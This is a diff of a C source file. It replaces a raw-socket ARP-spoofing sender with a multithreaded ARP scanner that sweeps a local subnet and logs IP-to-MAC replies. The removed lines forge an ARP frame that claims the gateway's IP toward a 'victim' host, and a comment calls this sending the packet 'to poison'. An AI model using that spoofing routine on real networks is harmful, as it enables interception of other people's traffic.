@@ -3,153 +3,142 @@
  * @Author: LinusZhao
  * @Date: 2019-10-24 15:38:10
  * @LastEditors: LinusZhao
- * @LastEditTime: 2019-10-24 21:31:39
+ * @LastEditTime: 2020-02-01 20:13:50
  * @Description: 实现一个arp广播包的发送 & arp的响应
  *****************************************************************/
+#include <pthread.h>
+#include "arp.h"
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <errno.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <net/ethernet.h>
-#include <netinet/if_ether.h>
-#include <arpa/inet.h>
-#include <netpacket/packet.h>
-#include <net/if.h>
-#include "iot_log.h"
- 
-// const items
-const char INTERFACE[] = "ens33";
-const uint8_t TargetMac[] = {0xff,0xff,0xff,0xff,0xff,0xff}; //broadcast's mac
-const uint8_t SourceMac[] = {0x00,0x0c,0x29,0x01,0x67,0xcb}; //ubuntu's mac  00:0c:29:01:67:cb
-const uint8_t TargetIp[] = {192,168,56,103};                 //victim's ip
-#define TARGET_IP       "192.168.56.103"
-const uint8_t SourceIp[] = {192,168,56,100};                 //gateway's ip, 这里很重要，因为我们要假装是网关，所以用网关的ip
- 
-// main function
-int main(int argc, char **argv) 
+DEV_ADDR_T SrcDevAddr = {
+    {0x00,0x0c,0x29,0x01,0x67,0xcb},    // ubuntu mac
+    {192,168,1,8}                       // ubuntu ip
+};
+
+DEV_ADDR_T DestDevAddr = {
+    {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
+    {192,168,1,1}
+};
+
+ARP_TAB_T ArpTabs[5];
+
+void *thr_fn2(void *arg)
 {
-    int arp_fd;
-    uint8_t frame[42];        //total length of ethernet head plus arp packet is 42 octets
-    uint8_t recvbuf[100];
-    uint8_t	controlbuf[100];
-    
-    // create socket -- 创建socket(套接字)
-    arp_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-    if(arp_fd < 0) {
-        LOG_ERR("socket() failed");
-        exit(1);
+    int ret = 0;
+    int count = 0;
+    while (1){
+        send_arp_packet(&SrcDevAddr,&DestDevAddr,ARPOP_REQUEST);
+        usleep(200*1000); //200ms
+        count++;
+        if(count == 15){
+            DestDevAddr.ip_addr[3]++;
+            count = 0;
+        }
     }
-    LOG_DEBUG("* Socket created.");
- 
     
-    // create arp frame -- 构建arp帧，其实就是将以太网头部和arp包组合，存入frame[]，前14字节为以太网头，后28字节为arp包
-    // 这里使用了2个预先定义好的struct，很方便，不需要我们自己纯手工构建arp帧了
-    struct ether_header eth_head;
-    struct ether_arp eth_arp;
- 
-    memcpy(eth_head.ether_dhost, TargetMac, ETHER_ADDR_LEN);
-    memcpy(eth_head.ether_shost, SourceMac, ETHER_ADDR_LEN);
-    eth_head.ether_type = htons(ETHERTYPE_ARP);
- 
-    eth_arp.arp_hrd = htons(ARPHRD_ETHER);
-    eth_arp.arp_pro = htons(ETHERTYPE_IP);
-    eth_arp.arp_hln = ETHER_ADDR_LEN;
-    eth_arp.arp_pln = 4;
-    eth_arp.arp_op = htons(ARPOP_REQUEST); // request or reply
-    memcpy(eth_arp.arp_sha, SourceMac, ETHER_ADDR_LEN);
-    memcpy(eth_arp.arp_spa, SourceIp, 4);
-    memcpy(eth_arp.arp_tha, TargetMac, ETHER_ADDR_LEN);
-    memcpy(eth_arp.arp_tpa, TargetIp, 4);
- 
-    // 组包复制到frame数组
-    memcpy(frame, &eth_head, sizeof(eth_head));
-    memcpy(frame + sizeof(eth_head), &eth_arp, sizeof(eth_arp));
-    LOG_DEBUG("* ARP frame created");
- 
- 
-    // make sockaddr_ll ready for sendto() function -- 用作sendto()函数中的参数，此处主要是指定一个网络接口
+	printf("thread 2 returning\n");
+	return((void *)2);
+}
+
+void *thr_fn1(void *arg)
+{
+    uint8_t recvbuf[1024];
+    uint8_t	controlbuf[100];
+    int ret = 0,count = 0;
+    char previousIpAddr[16]={"255.255.255.0"},tmpIpAddr[16];
+
     struct sockaddr_ll destaddr;
     destaddr.sll_family = AF_PACKET;
-    if((destaddr.sll_ifindex = if_nametoindex(INTERFACE)) == 0) {
+    if((destaddr.sll_ifindex = if_nametoindex("ens33")) == 0) {
         LOG_ERR("if_nametoindex() failed");
-        exit(1);
+        return (void *)-1;
     }
     destaddr.sll_halen = htons(ETHER_ADDR_LEN);
-    LOG_DEBUG("* struct sockaddr_ll destaddr ready.");
- 
- 
-    // send packet to poison -- 将我们之前伪造好的arp响应包发送出去
-    if(sendto(arp_fd, frame, sizeof(frame), 0, (struct sockaddr *)&destaddr, sizeof(destaddr)) == -1) {
-        LOG_ERR("sendto() failed");
-        exit(1);
-    }
-    LOG_DEBUG("* Packet sent.");
- 
-    // close socket -- 完成后关闭socket
-    close(arp_fd);
-    LOG_DEBUG("* Socket closed.");
-
-    // 监听arp reply
+    
     int rev_arp_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if(rev_arp_fd < 0) {
         LOG_ERR("socket rev_arp_fd failed");
-        exit(1);
+        return (void *)-2;
     }
-    LOG_DEBUG("* Socket rev_arp_fd created.");
-    
-    struct sockaddr_in serve_addr;
-    bzero(&serve_addr,sizeof(serve_addr));
-    serve_addr.sin_family = AF_INET;
-    // serve_addr.sin_addr.s_addr = htonl();
-    if(inet_pton(AF_INET, TARGET_IP, &serve_addr.sin_addr) <= 0){
-        LOG_ERR("inet_pton error");
-        exit(1);
-    }
-    serve_addr.sin_port = htons(8888); // IP层端口可以随意填写
-    if ( bind(rev_arp_fd,(struct sockaddr *)&serve_addr, sizeof(serve_addr)) < 0){
-        LOG_ERR("bind error");
-        // exit(1);
-    }
+
     struct msghdr arp_reply_msg;
-    struct iovec	iov;
+    struct iovec  iov;
     iov.iov_base = recvbuf;
 	iov.iov_len = sizeof(recvbuf);
-    
-    arp_reply_msg.msg_name = (struct sockaddr *)&destaddr;
-    arp_reply_msg.msg_iov = &iov;
-    arp_reply_msg.msg_iovlen = 1; // 为啥是 1 ？
+    arp_reply_msg.msg_name    = (struct sockaddr *)&destaddr;
+    arp_reply_msg.msg_iov     = &iov;
+    arp_reply_msg.msg_iovlen  = 1; // 为啥是 1 ？
     arp_reply_msg.msg_control = controlbuf;
+
     while(1){
 		arp_reply_msg.msg_namelen = sizeof(destaddr);
 		arp_reply_msg.msg_controllen = sizeof(controlbuf);
-		int n = recvmsg(rev_arp_fd, &arp_reply_msg, 0);
-		if (n < 0) {
+        int rev_num;
+		rev_num = recvmsg(rev_arp_fd, &arp_reply_msg, 0);
+		if (rev_num < 0) {
 			if (errno == EINTR)
 				continue;
 			else
 				LOG_ERR("recvmsg error");
 		}
-        LOG_DEBUG("arp_reply_msg:%d\n",n);
+        // LOG_DEBUG("arp_reply_msg:%d\n",rev_num);
+        int i = 0;
+        // for(i = 0; i < rev_num; i++){
+        //     printf("%02x ",recvbuf[i]);
+        // }
         struct ether_header *eth_head_p = (struct ether_header *)recvbuf;
         struct ether_arp *eth_arp_p = (struct ether_arp *)(recvbuf + sizeof(struct ether_header));
-        
-        int i = 0;
-        if(eth_arp_p->arp_op == htons(ARPOP_REPLY) ){
-            for (i = 0; i < ETHER_ADDR_LEN; i++){
-                printf("%x ",eth_arp_p->arp_sha[i]);
+        if(eth_arp_p->arp_op == htons(ARPOP_REPLY)){
+            snprintf(tmpIpAddr,16,"%d.%d.%d.%d",
+                            eth_arp_p->arp_spa[0],eth_arp_p->arp_spa[1],\
+                            eth_arp_p->arp_spa[2],eth_arp_p->arp_spa[3]);
+            if(strcmp(previousIpAddr,tmpIpAddr) != 0){
+                strcpy(ArpTabs[count].ip_addr,tmpIpAddr);
+                memcpy(ArpTabs[count].hw_addr,eth_arp_p->arp_sha,ETHER_ADDR_LEN);
+                LOG_NOTICE("%02x:%02x:%02x:%02x:%02x:%02x ==> %s",
+                    ArpTabs[count].hw_addr[0],ArpTabs[count].hw_addr[1],ArpTabs[count].hw_addr[2],\
+                    ArpTabs[count].hw_addr[3],ArpTabs[count].hw_addr[4],ArpTabs[count].hw_addr[5],\
+                    ArpTabs[count].ip_addr);
+                strcpy(previousIpAddr,tmpIpAddr);
+                count++;
             }
-            printf("\r\n");
-            for (i = 0; i < 4; i++){
-                printf("%d.",eth_arp_p->arp_spa[i]);
+            if(sizeof(ArpTabs)/sizeof(ArpTabs[0]) == count){
+                printf("thread 1 exiting\n");
+                pthread_exit((void *)1);
             }
-            printf("\r\n"); 
         }
- 
 	}
+}
+
+int main(int argc, char **argv) 
+{
+    int ret = 0;
+    void *tret;
+    
+    pthread_t thr_1, thr_2;
+    ret = pthread_create(&thr_1,NULL,thr_fn1,NULL);
+    if (ret != 0){
+        LOG_ERR("pthread_create fail , ret:%d",ret);
+        exit(1);
+    }
+    LOG_NOTICE("pthread_create thr_fn1 success.");
+    ret = pthread_create(&thr_2,NULL,thr_fn2,NULL);
+    if (ret != 0){
+        LOG_ERR("pthread_create fail , ret:%d",ret);
+        exit(1);
+    }
+    LOG_NOTICE("pthread_create thr_fn2 success.");
+
+    ret = pthread_join(thr_1, &tret);
+	if (ret != 0){
+        LOG_ERR("can't join with thread 1");
+    }
+	LOG_NOTICE("thread 1 exit code %ld\n", (long)tret);
+
+	ret = pthread_join(thr_2, &tret);
+	if (ret != 0){
+        LOG_ERR("can't join with thread 2");
+    }
+	LOG_NOTICE("thread 2 exit code %ld\n", (long)tret);
  
     return 0;
 }
